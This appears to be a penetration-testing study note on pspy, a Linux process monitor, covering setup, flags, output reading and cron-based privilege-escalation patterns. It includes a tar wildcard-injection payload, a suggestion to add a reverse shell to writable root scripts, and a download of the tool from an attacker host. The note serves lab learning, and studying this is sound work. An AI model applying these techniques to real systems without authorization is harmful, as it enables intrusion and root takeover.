# pspy

**Tags:** `#pspy` `#privesc` `#linux` `#enumeration` `#cron` `#postexploit`

Unprivileged Linux process monitor. Watches for new processes without needing root — catches cron jobs, scripts, and commands run by other users (including root) as they execute. Essential for spotting cron-based privesc opportunities and credential leakage in process arguments.

**Source:** https://github.com/DominicBreuker/pspy
**Install:** Download precompiled binary from releases — no install on target needed

```bash
./pspy64
```

> [!note]
> Let pspy run for several minutes — cron jobs may only fire every minute or every 5 minutes. Watch for processes running as UID 0 (root) that involve scripts you can write to, or commands that contain credentials in their arguments.

---

## Setup

```bash
# Download correct arch binary from Kali
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64   # 64-bit
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32   # 32-bit

# Serve to target
python3 -m http.server 8000

# On target
wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
```

---

## Usage

```bash
# Basic — watch new processes (procevents is on by default)
./pspy64

# See everything: new processes + filesystem events
./pspy64 -pf

# Filesystem events only (inotify — file reads/writes/creates)
./pspy64 -f

# Watch extra dirs recursively (defaults already cover /usr,/tmp,/etc,/home,/var,/opt)
./pspy64 -r /opt/app -r /srv

# Record parent PIDs — trace what spawned each process
./pspy64 --ppid

# Slower scan interval — less CPU, but you WILL miss short-lived processes
./pspy64 -i 1000      # milliseconds; default is 100

# Disable color (it's ON by default) — do this before piping to grep
./pspy64 -c=false
```

> [!warning] **There is no UID filter.** pspy has no `-u`/`--uid` flag — `./pspy64 -u 0` errors with *"unknown shorthand flag: 'u'"* (v1.2.1). To home in on root activity, disable color and grep the stream instead:
> ```bash
> ./pspy64 -c=false | grep 'UID=0'
> ```
> Lowering `-i` catches more short-lived processes at the cost of CPU; the 100 ms default is usually fine.

### Flags (verified against v1.2.1)

| Flag | Default | Purpose |
|---|---|---|
| `-p, --procevents` | on | Print new processes — the core feature |
| `-f, --fsevents` | off | Print filesystem events (inotify) |
| `-i, --interval <ms>` | 100 | Process-scan interval; lower = catch more, more CPU |
| `-r, --recursive_dirs <dir>` | /usr,/tmp,/etc,/home,/var,/opt | Watch these dirs recursively (repeatable) |
| `-d, --dirs <dir>` | — | Watch these dirs, non-recursive (repeatable) |
| `--ppid` | off | Record parent PIDs |
| `-c, --color` | on | Colorize output — pass `-c=false` to turn off |
| `-t, --truncate <n>` | 2048 | Truncate cmdlines longer than n chars |
| `--debug` | off | Print detailed error messages |

---

## Reading Output

```
# Format: timestamp UID=<uid> PID=<pid> CMD=<command>
2024/01/01 00:01:00 CMD: UID=0    PID=1234   | /bin/bash /opt/backup.sh
2024/01/01 00:01:00 CMD: UID=1001 PID=1235   | python3 /home/user/app.py
```

**What to look for:**
- `UID=0` running scripts you can write to — **or a root job whose *input* you control** (a file/dir you own that it re-parses; see [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] → *Privileged process, attacker-controlled input*)
- Credentials in command arguments (`--password`, `-p`, API keys)
- Scripts in world-writable directories being called by root
- Wildcard usage in commands (e.g., `tar * `, `chown *`)

> [!warning] **The first burst is a startup inventory, not events.** On launch pspy enumerates every process *already running* and prints them all at once — those are not new events, and their timestamps cluster at your start time. The actual cron/scheduled hit you're hunting arrives **later**, on its own timestamp. Don't mistake the initial dump for the finding (or conclude "nothing fired" from it) — let it run past the inventory and watch for a fresh line.

---

## Exploitable Patterns

```bash
# Root runs a script you can modify
UID=0 ... /bin/bash /opt/scripts/backup.sh
# → Check: ls -la /opt/scripts/backup.sh — if writable, add reverse shell

# Root uses wildcard with tar (wildcard injection)
UID=0 ... tar czf /backup/archive.tgz /var/www/*
# → Create: --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# Credentials in args
UID=0 ... mysql -u root -pPassword123 database
UID=0 ... curl -u admin:secret http://internal/

# Script calls another script in writable location
UID=0 ... /usr/local/bin/monitor.sh → calls /tmp/check.sh
```

---

## Cron Timing Reference

```bash
# Common cron intervals to watch for
* * * * *     → every minute
*/5 * * * *   → every 5 minutes
0 * * * *     → every hour

# Also check static cron files while pspy runs
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
crontab -l     # current user's cron
```


> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] (CPTS v2).

---

*Created: 2026-03-13*
*Updated: 2026-08-20*
*Model: claude-opus-5*
